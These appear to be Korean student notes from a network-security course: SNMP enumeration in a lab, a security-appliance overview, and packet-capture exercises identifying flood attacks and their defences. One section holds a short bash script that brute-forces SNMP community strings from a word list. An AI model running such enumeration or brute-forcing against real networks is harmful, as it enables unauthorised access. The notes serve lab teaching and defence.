				# snmptranslate -Tp 							구조 출력 트리형식으로 
			
			(리눅스200)
				1. # snmpwalk -v1 -c public localhost .1
				2. # mkdir -p /test && cd /test 
				3. # snmptranslate -Tl > /test/mibtree.txt 	
				4. # cat /test/mibtree.txt | egrep '(Swap|mem)' 
				5. # snmpwalk -v 1 -c public localhost .1.3.6.1.4.1.2021.4.5	-> 정상이 아닌 화면이 나옴 
				6. 그래서 셋팅을 바꿈 정보를 볼수 있도록
				7. # cd /etc/snmp
				8. # cp -p snmp.conf snmp.conf.orig
				9. # vi snmpd.conf 
					110~151 까지 보고 잘 편집ㅋㅋ
				10.# systemctl restart snmpd
				11.# snmpwalk -v 1 -c public localhost .1.3.6.1.4.1.2021.4.5	-> 정상 나옴 
				12.# free	이거랑 위랑 비교 남은 용량
			(칼리)
				1. # snmpwalk -v 1 -c public localhost .1	-> 정보가 다나옴 대략 12254 줄
				2. # snmp-check -c public 192.168.20.200	-> 정보가 다 나옴 !!
			(리눅스200)
				1. # cat /test/mibtree.txt | egrep ipForwarding 
				2. # snmpwalk -v2c -c public localhost .1.3.6.1.2.1.4.1 
				3. # sysctl -a | grep ip_forward 
			
		[실습] 공격 툴 개발 
			(리눅스200)
				1. # snmpwalk -v2c -c public localhost .1.3.6.1.2.1.4.1 
				2. #  echo $? 
					0
				3. # snmpwalk -v2c -c private localhost .1.3.6.1.2.1.4.1 
					Timeout: No Response from localhost
				4. #  echo $?
					1
			(칼리)
				1. # cd /root/bin 
				2. # vi dict.txt 
					private
					admin
					ibm
					cisco
					ms
					admin2
					administarator
					public
				3. # vi onesixtyone.sh 
					#!/bin/bash
					IP1=192.168.20.200
					Dict=/root/bin/dict.txt
					OID1='.1.3.6.1.2.1.4.1'
					for i in $(cat $Dict)
					do
						snmpwalk -v2c -c $i $IP1 $OID1 > /dev/null 2>&1
						if [ $? -eq 0 ] ; then
							echo "[+] $IP's commnuication name : $i"
							exit 0
						else
							echo "[-]$i"
						fi
					done
				4. # ./onesixtyone.sh 192.168.20.200 dict.txt 
				
				
보안장비 설명
	배운내용
		1. Foot Printing(공격의 첫번째 단계)
			정보를 수집 
		2. Sniffing
			감청 
		3. Spoofing
			속이다
		4. Session Hijacking
			세션 갈취 
		5. Denial of Service(DoS)/Distributed DoS(DDoS)		
			서버 부하
	
	보안 장비의 종류
		1. 단일 보안 솔루션 : 하나의 보안
			1.VPN
				● Site-to-site VPN(방화벽앞단), Remote access VPN(방화벽뒷단)
				● PPTP, L2TP, IPsec(사용), SSL/TLS(사용)	: 앞에 두개는 사용을 잘 안함
			
			2.방화벽 FireWall(Packet filtering + NAT/PAT)
				● 네트워크 방화벽/시스템 방화벽
				● IP(L3)/ PORT(L4)단의 룰셋 설정가능과 운용 공격자 IP나 불필요한 포트 차단
					리눅스의 iptables(firewalld)
					윈도우의 ipsec기능
					유닉스의 ipfilter기능
			
			3.IPS/IDS 
				● IPS = IDS + F/W 
					H-IPS(Host-based IPS), N-IPS(Network-based IPS)
				● snort룰 기반으로 패턴을 대입하여 시스템 공격에 대한 탐지 및 차단을 주로 병행(ftp, ssh 등)
					H-IDS(Host-based IDS), N-IDS(Network-based IDS)
			
			4.웹방화벽(Web Application Firewall)/웹애플리케이션 방화벽
				웹공격에 대한 차단을 해주는 방화벽임 
			
			5.DDoS 차단 시스템(Anti DDoS, DDoS Wall)
				● DDOS 공격에 대한 패킷 필터링 장비 임계치 설정 가능
				
			6.L4 스위치
				● IP와 PORT 기준의 로드벨런스 예) client IP가 홀수인 경우 A장비로 짝수인 경우 B장비 설정

			7.L7스위치
				● Application(L7)별로 로드 벨런스
				● 웹서버나 WAS서버의 세션 임계치를 두어 세션이 적은곳에 뿌려줌
			
		2. 통합 보안 솔루션 : 여러 장비의 보안 
			1.NAC
				● - 접근 제어/인증 : 내부 직원 역할 기반의 접근 제어, 네트워크의 모든 IP 기반 장치 접근 제어
	
			2.UTM(Unified Threat Management)/통합 보안시스템
				● FW(NAT) + VPN + IDS/IPS + WAF + Spam Filter + NAC + AV + ....
					중소에서 여러 장비를 나눠서 하기 힘들기 때문에 이하나의 장비로 함 원하는 기능만 킬 수 있음 
				● UTM ==~ TMS
					거의 흡사하다는 뜻 
			
			3.ESM(Enterprise Security Managemnt)
				● ESM = UTM + 통합로그 관리/모니터링
					보안관제에 사용됨 각 장비에 에이전트 설치 후 SMTP,HTTP등 정보를 가져올 수 있는 정보를 원격으로 보낸다 ESM은 이걸 받아서 DB로 받아 웹 페이지로 보여줌
				● ESM ==~ SIEMS
			
			4.SIEMs(Security Information and Event Management Solutions)
				● SIEMS = UTM + ESM
					원격관제에서 사용하는 것 
			
			[관제서비스참고]
			옛날)  장비와 인력을 보내서 해당 장소에서 관제하는것
			현대)  인터넷이 발전되면서 이러한장비에 나오는 내용을 원격으로 다 받을수있게함(VPN)
			발전중)이후에는 보안장비를 원래 회사에 두고 트래픽을 원래회사를 거쳐서 관리하는회사에게 가게하는 방법이 있다 
				
			5.TMS(Threat Management System)->기술 / RMS(Risk Management System)->문서화
				문서화 작업을 하기 쉽도록 제작되어있다(워크플로우가 아주 쉬움)
					-보안사고 발생
					-사이트에 등록
					-다음사람이 관리


					
==========================================================================================================================================================================================

[문제]
	[실습1] 패킷 분석을 통해 어떤 프로토콜 패킷인지 확인해 보자.(작업 시간: 5분)
		● 분석 파일 : lawcode.txt 
		● 어떤 종류의 패킷인가? echo request
		● 어떤 프로토콜 패킷인가? ICMP

	[실습2] 공격 패킷에 대해서 분석하여 보자.(작업 시간 10분)

		● 분석파일 : attack1.pcap
		----------------------------------------------
		출발지 IP	: 랜덤
		출발지 Port	: 1080 1081
		
		목적지 IP	: 192.168.1.15
		목적지 Port	: 80
		----------------------------------------------
		● 출발지 IP는 계속 변화하는가 항상 일정한가? 변함
		● 출발지 Port는 계속 변화하는가 항상 일정한가? 1080과1081돌아감
		● 목적지 IP는 계속 변화하는가 항상 일정한가? 일정
		● 목적지 Port는 계속 변화하는가 항상 일정한가? 일정

		● 공격 패킷의 특성은? SYN을 많이 보냄
		● 결론적으로 어떤 공격이라고 판단할 수 있는가? tcp syn flooding 
		● 이런 패킷을 방어 하는 방법은? 백로그 큐를 늘린다, syn cookie 사용, 보안장비 사용  

	[실습3] 공격 패킷에 대해서 분석하여 보자.(작업시간 10분)

		● 분석파일 : attacker2.pcap
		----------------------------------------------
		출발지 IP	: 192.168.20.50
		출발지 Port	: 변화

		목적지 IP	: 192.168.20.201
		목적지 Port	: 80
		----------------------------------------------
		● 출발지 IP는 계속 변화하는가 항상 일정한가? 일정
		● 출발지 Port는 계속 변화하는가 항상 일정한가? 변화
		● 목적지 IP는 계속 변화하는가 항상 일정한가? 일정
		● 목적지 Port는 계속 변화하는가 항상 일정한가? 일정

		● 공격 패킷의 특성은? UDP패킷을 보냄
		● 결론적으로 어떤 공격이라고 판단할 수 있는가? UDP flooding Attack
		● 이런 패킷을 방어 하는 방법은? ACL에 정책 추가(초당100번보내는거 거부), 인바운드 패킷에 임계치 설정 차단, 보안장비 사용

	[실습4] 공격 패킷에 대해서 분석하여 보자.(작업시간 10분)
	
		● 분석파일 : attacker3.pcap
		----------------------------------------------
		출발지 IP	: 192.168.20.50
		출발지 Port	: 랜덤

		목적지 IP	: 192.168.20.201
		목적지 Port	: 80
		----------------------------------------------
		● 출발지 IP는 계속 변화하는가 항상 일정한가? 일정
		● 출발지 Port는 계속 변화하는가 항상 일정한가? 변함
		● 목적지 IP는 계속 변화하는가 항상 일정한가? 일정
		● 목적지 Port는 계속 변화하는가 항상 일정한가? 일정

		● 공격 패킷의 특성은? get 메소드 계속 보냄
		● 결론적으로 어떤 공격이라고 판단할 수 있는가? http get flooding 
		● 이런 패킷을 방어 하는 방법은? 출발지 IP 의 차단, 요청횟수 임계치 설정, 보안장비, 웹방화벽, 

	[실습5] 공격 패킷에 대해서 분석하여 보자.(작업시간 30분)
		
		● 분석파일 : attacker4.pcap
		----------------------------------------------
		출발지 IP	:
		출발지 Port	:
		
		목적지 IP	:
		목적지 Port	:
		----------------------------------------------
		● 출발지 IP는 계속 변화하는가 항상 일정한가?
		● 출발지 Port는 계속 변화하는가 항상 일정한가?
		● 목적지 IP는 계속 변화하는가 항상 일정한가?
		● 목적지 Port는 계속 변화하는가 항상 일정한가?
		
		● 공격 패킷의 특성은?				
		● 결론적으로 어떤 공격이라고 판단할 수 있는가?	
		● 이런 패킷을 방어 하는 방법은?






















		
		
		


























			
			






[참고] 운영체제 전체 업데이트
	yum check-update		리눅스계열??
	yum -y update
		
	apt-get update			업데이트할수있는거 확인하는것 	데비안계열??
	apt-get dists-upgrade 	운영체제

(참고사항)
			[참고] browser 는 윈도우가 사용 
				공유된 리소스 검색하는것임 SMB처럼 공유된 서버를 검색하는것인데 이렇게 검색할때 사용 하는것이 browser임 netbios에서 사용 
			
			[참고] SSDP 는 네트워크 서비스나 정보를 찾기 위해서 사용하는 네트워크 프로토콜 
				네트워크 상에 물려있는 장치를 찾을때 쓰는것임 장비가 붙으면 멀티캐스트해서 서버의 장비들이 서로 붙어있는것을 확인할수잇음
				멀티캐스트 : 239.255.255.250
				프로토콜   : UDP
			
			[참고] favicon.ico 는 URL 옆에 아이콘파일을 말하는것임
			
			[참고] 인코딩은 데이터 손실을 막기위해 사용한다 이유는 컴퓨터에 보이지않는 엔터나 컨트롤 등에 대해 유지하려고 벗 암호화는 키를이용해 스니핑을 방지하는것

[참고] 와이어샤크
	MAC주소 뒤에 괄호는 원래 괄호인데 앞에 내용으로 바꿔서 쓴것임 ()내용이 원래내용
	핑을 줄때 윈도우로하면 윈도우는 반대로 브로드캐스트해서 자기도 MAC주소를 확인해 본다 						
	와이어샤크의 2번째 창에서 대괄호 안은 프로그램이 해석한 것으로 실제적으로 있는것이 아님
	와이어샤크를 연다 -> 오른쪽 밑에 프로파일 우클릭 -> 매니저 -> add하고 새로운 ktproject -> 적용된걸 확인
	왼쪽 위에 Edit클릭 -> 맨밑 프리페어런스 클릭 -> user interfac -> columns -> add 하고 srcport,desport 하고 각각 파일 타입을 송신포트(unresolved) 수신포트(unresolved) 하기
	

	
	
	
linux200
192.168.20.200/24
00:0c:29:e9:84:bf 

KaliLinux
192.168.20.50/24
00:0c:29:d7:28:88
 
window2008
192.168.20.201/24
00-0C-29-C4-E5-D6





		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		